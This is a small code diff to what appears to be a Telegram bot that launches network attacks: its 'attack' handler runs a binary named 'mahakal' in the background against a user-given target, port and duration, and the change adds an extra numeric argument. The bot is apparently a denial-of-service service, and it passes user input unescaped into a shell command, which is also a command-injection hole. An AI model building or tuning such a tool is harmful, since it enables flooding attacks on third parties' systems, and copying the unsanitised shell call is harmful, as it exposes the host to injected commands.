@@ -212,7 +212,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     # Run attack in background
-    subprocess.Popen(f"nohup ./mahakal {target} {port} {attack_time} > /dev/null 2>&1 &", shell=True)
+    subprocess.Popen(f"nohup ./mahakal {target} {port} {attack_time} 150 > /dev/null 2>&1 &", shell=True)
 
     # ✅ Attack complete hone ka wait background me rakho
     asyncio.create_task(attack_completed_message(update, target, port, attack_time))
